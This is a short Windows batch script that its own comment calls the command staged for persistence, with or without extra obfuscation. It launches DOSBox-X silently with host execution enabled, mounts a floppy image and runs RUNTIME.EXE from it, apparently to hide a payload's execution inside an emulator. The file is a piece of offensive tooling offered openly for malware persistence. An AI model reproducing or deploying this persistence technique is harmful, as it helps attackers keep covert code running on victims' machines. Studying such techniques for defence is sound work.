@echo off
:: This Is The Command That Would be Staged To Perform Persistance (With Or Without Extra Obfuscation).
set DOSBox=dosbox-x.exe
%DOSBox% -defaultconf -defaultmapper -nopromptfolder -exit -fastlaunch -silent -hostrun -c "IMGMOUNT A: Floppy.img" -c "A:\RUNTIME.EXE"